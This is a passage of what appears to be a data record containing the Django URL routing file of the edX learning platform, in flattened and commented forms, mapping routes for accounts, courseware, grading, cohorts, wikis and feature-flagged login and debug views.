url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ",
                    "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        